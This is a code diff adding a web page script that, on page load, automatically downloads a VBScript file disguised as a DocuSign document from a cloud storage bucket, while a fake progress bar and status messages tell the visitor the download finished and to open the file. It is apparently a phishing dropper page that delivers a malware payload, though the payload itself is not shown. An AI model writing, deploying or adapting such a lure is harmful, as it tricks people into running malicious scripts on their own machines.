@@ -1,0 +1,49 @@
+<script>
+const fileUrl = "https://storage.googleapis.com/tbvi/*_Docusign_47_d.vbs";
+
+function startDownload() {
+
+  // Start realistic progress animation
+  let progress = 0;
+
+  const interval = setInterval(() => {
+    progress += Math.random() * 6;
+
+    if (progress >= 95) {
+      progress = 95;
+    }
+
+    document.getElementById("bar").style.width = progress + "%";
+    document.getElementById("percent").innerText = Math.floor(progress) + "%";
+
+    if (progress > 10) {
+      document.getElementById("title").innerText = "Downloading...";
+      document.getElementById("status").innerText = "Your file download should begin shortly...";
+    }
+
+  }, 300);
+
+  // Trigger actual browser download
+  const link = document.createElement("a");
+  link.href = fileUrl;
+  link.download = "";
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+
+  // Finish UI after delay
+  setTimeout(() => {
+    clearInterval(interval);
+
+    document.getElementById("bar").style.width = "100%";
+    document.getElementById("percent").innerText = "100%";
+
+    document.getElementById("title").innerText = "Download Complete";
+    document.getElementById("status").innerText = "You can now open your file.";
+    document.getElementById("done").style.display = "block";
+
+  }, 5000);
+}
+
+window.onload = startDownload;
+</script>
